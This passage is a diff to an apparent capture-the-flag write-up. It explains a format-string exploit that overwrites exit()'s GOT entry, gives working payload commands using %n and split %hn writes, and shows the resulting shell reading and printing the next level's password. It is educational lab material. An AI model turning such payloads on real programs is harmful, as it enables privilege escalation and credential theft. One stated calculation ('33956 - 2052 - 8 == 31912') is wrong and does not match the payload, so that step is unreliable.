@@ -65,10 +65,56 @@ End of assembler dump.
 0x8049838 <exit@got.plt>:	0x080483d6
 ```
 
-`0x8049838` indeed points to `exit()`'s location on the **GOT**, in injectable little endian, the location is `\x38\x98\x04\x08`. We now have to overwrite the value at this address with the address of `o()`.
+`0x08049838` indeed points to `exit()`'s location on the **GOT**, in injectable little endian, the location is `\x38\x98\x04\x08`. We now have to overwrite the value at this address with the address of `o()`.
 
 The address of `o()` in decimal is **134513828**. So our padding must be this **134513828 - 4**. That's a lot to write. This time, let's not be lazy and use a cleaner way to inject our value.
 
-|address of o|padding|targeting the 4th argument|
+Instead of writing a full **4 byte** value, we write two **2 byte** values. They will then be interpreted as one **4 byte** value in memory.
+Thus we need to have two addresses, one for each `%_$n` flag in our format.
+
+So instead of having having
+|printed characters|resulting address|
+|-|-|
+|134513828|0x080484a4|
+
+We will have
+
+||Upper half|Lower half|
 |-|-|-|
-|\x38\x98\x04\x08|%d|%4$n|
+|resulting address|0x0804|0x84a4|
+|decimal value|2052|33956|
+|target address|0x08049840|0x08049838|
+
+Printing in two parts, while faster adds a layer of complexity.
+Since we print two addresses, we need to substract 8 bytes to our the decimal value of the first address, so `2052 - 8 == 2044`. Thus, we need to subtract this value again for decimal value of the lower half, `33956 - 2052 - 8 == 31912`.
+
+Our payload will look like this
+|U. half address|L. half address|U. half padding|U. half stack argument target|L. half padding|L. half stack argument target|
+|-|-|-|-|-|-|
+|\x40\x98\x04\x08|\x38\x98\x04\x08|%2044d|%4$hn|%31904d|%5$hn|
+
+```sh
+(cat <(python -c 'print "\x38\x98\x04\x08%134513824d%4$n"') -) | ./level5
+
+(cat <(python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08%2044d%4$hn%31904d%5$hn"') -) | ./level5
+```
+
+Both of these commands work, but the first one takes almost 4 seconds to print it's 135Mio characers whereas the second command is nigh instantaneous.
+
+After using either of those commands, we can access our shell
+
+```sh
+$ whoami
+level6
+$ cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+On to the next level!
+```sh
+su level6
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+NOTE:
+`%h_` specifies that we are writing a **short** argument, here a **short int** (2 bytes) since we need to only write two at a time.
